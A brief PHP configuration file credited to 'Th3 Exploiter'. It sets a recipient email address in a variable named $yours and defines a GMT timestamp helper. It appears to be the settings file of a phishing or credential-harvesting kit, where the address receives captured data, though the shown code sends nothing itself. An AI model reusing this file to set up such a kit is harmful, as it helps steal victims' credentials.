<?php
	/*
	/ -> All Created By Th3 Exploiter
	/ -> https://www.youtube.com/user/FireInfoOfficiel
	/ -> https://www.facebook.com/Officiel.Exploiter
	*/
	

	// ================================= //

	$yours = "khayrolislam@yandex.com";

	// ================================= //


	function now() {
		date_default_timezone_set('GMT');
		return date("d/m/Y H:i:s");
	}

?>